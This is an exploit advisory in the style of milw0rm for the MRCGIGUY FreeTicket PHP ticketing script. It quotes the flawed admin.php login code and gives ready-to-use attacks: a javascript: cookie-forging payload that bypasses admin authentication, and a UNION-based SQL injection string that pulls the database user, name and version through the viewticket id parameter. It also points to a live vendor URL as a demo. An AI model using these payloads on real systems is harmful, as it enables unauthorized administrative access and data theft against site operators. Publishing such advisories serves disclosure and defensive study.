@@ -1,0 +1,37 @@
+MRCGIGUY FreeTicket Multiple Remote Vulnerabilities
+Founder: ThE g0bL!N
+------
+Home: http:/www.4ckx.com/dz/
+----
+Download: http://www.mrcgiguy.com/cgi-bin/freedown.cgi?id=1
+Vendor:http://www.mrcgiguy.com
+Special Thx:  Snakespc His0k4
+Note: Algerie 3-1 Egypt
+Exploit:
+------
+Cookies insecure
+----------------
+File:
+----
+admin.php
+Code:
+---
+if (($checkid == $adminuser) && ($checkpass == $adminpass)) {$opid = $adminuser;} => First
+ if ($opid) {
+  setcookie("freeticket_cookie", "$opid", time()+86400); => Second
+  header("location: $baseurl");
+  exit;
+  Exploit:
+  -------
+  javascript:document.cookie="freeticket_cookie=[admin_name];path=/freeticket/";
+  
+ 2) SQL Injection: (out of cookies)
+    --------------
+    admin.php?action=viewticket&id=[sql code ]
+   
+    [sql code]=156+union+select+1,concat(user(),0x3a,database(),0x3a,version()),3,4,5,6,7,8,9,10--
+    Demo:
+    ----
+    http://www.mrcgiguy.com/freeticket/admin.php
+
+# milw0rm.com [2009-06-10]
